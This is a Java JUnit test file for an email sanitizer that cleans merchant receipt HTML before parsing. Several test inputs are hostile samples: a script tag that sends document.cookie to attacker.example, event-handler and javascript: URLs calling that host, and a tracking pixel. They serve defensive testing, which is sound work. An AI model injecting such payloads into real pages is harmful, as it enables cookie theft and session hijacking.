package com.finora.integrations.google.merchant;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * The one security-relevant class in C5. Every test here is checking the same thing from a
 * different angle: an attacker-controlled email must never reach a parser, a log line, or (once
 * C5-B exists) a review UI carrying anything that executes or calls out.
 */
class MerchantEmailSanitizerTest {

    private final MerchantEmailSanitizer sanitizer = new MerchantEmailSanitizer();

    @Test
    @DisplayName("a script tag and its body do not survive sanitization")
    void scriptTagsAreRemovedEntirely() {
        String raw = "<p>Your order shipped.</p><script>fetch('https://attacker.example/steal?c='+document.cookie)</script>";

        SanitizedGmailMessage result = sanitizer.sanitize("m1", "amazon.in", raw);

        assertThat(result.safeHtml()).doesNotContain("script").doesNotContain("attacker.example");
        assertThat(result.plainText()).doesNotContain("attacker.example");
    }

    @Test
    @DisplayName("an inline event handler does not survive, even on an allowed tag")
    void eventHandlersAreStripped() {
        String raw = "<p onmouseover=\"fetch('https://attacker.example')\">Hover for tracking</p>";

        SanitizedGmailMessage result = sanitizer.sanitize("m1", "amazon.in", raw);

        assertThat(result.safeHtml()).doesNotContain("onmouseover").doesNotContain("attacker.example");
    }

    @Test
    @DisplayName("a javascript: URL does not survive")
    void javascriptUrlsAreStripped() {
        String raw = "<a href=\"javascript:fetch('https://attacker.example')\">Track package</a>";

        SanitizedGmailMessage result = sanitizer.sanitize("m1", "amazon.in", raw);

        assertThat(result.safeHtml()).doesNotContain("javascript:").doesNotContain("attacker.example");
    }

    /** Links carry no parsing value and are pure attack surface (phishing, tracking) -- excluded
     *  entirely rather than sanitized-and-kept. */
    @Test
    @DisplayName("links are dropped outright, not merely defanged")
    void linksAreNotAllowedAtAll() {
        String raw = "<p>Total: Rs. 500.00</p><a href=\"https://amazon.in/orders\">View order</a>";

        SanitizedGmailMessage result = sanitizer.sanitize("m1", "amazon.in", raw);

        assertThat(result.safeHtml()).doesNotContain("<a ").doesNotContain("href");
    }

    /** Tracking pixels and any other image are pure attack surface (remote fetch on open) and have
     *  no parsing value. */
    @Test
    @DisplayName("images, including tracking pixels, are dropped outright")
    void imagesAreNotAllowedAtAll() {
        String raw = "<p>Order confirmed.</p>"
                + "<img src=\"https://attacker.example/pixel.gif?uid=12345\" width=\"1\" height=\"1\">";

        SanitizedGmailMessage result = sanitizer.sanitize("m1", "amazon.in", raw);

        assertThat(result.safeHtml()).doesNotContain("<img").doesNotContain("attacker.example");
    }

    /** Table structure is exactly what receipt templates use to lay out item rows and a totals
     *  row -- losing it would make every parser's job harder for no safety gained. */
    @Test
    @DisplayName("table structure survives, so a parser can still read row/column layout")
    void tableStructureIsPreserved() {
        String raw = "<table><tr><td>Item</td><td>Price</td></tr>"
                + "<tr><td>Widget</td><td>Rs. 100.00</td></tr></table>";

        SanitizedGmailMessage result = sanitizer.sanitize("m1", "amazon.in", raw);

        assertThat(result.safeHtml()).contains("<table").contains("<tr").contains("<td");
    }

    @Test
    @DisplayName("plain text strips tags and collapses the whitespace they leave behind")
    void plainTextIsReadableNotMangled() {
        String raw = "<table><tr><td><b>Order Total:</b></td><td>Rs. 500.00</td></tr></table>";

        SanitizedGmailMessage result = sanitizer.sanitize("m1", "amazon.in", raw);

        assertThat(result.plainText()).contains("Order Total: Rs. 500.00");
    }

    @Test
    void nullBodyProducesAnEmptyMessageRatherThanThrowing() {
        SanitizedGmailMessage result = sanitizer.sanitize("m1", "amazon.in", null);

        assertThat(result.safeHtml()).isEmpty();
        assertThat(result.plainText()).isEmpty();
    }
}
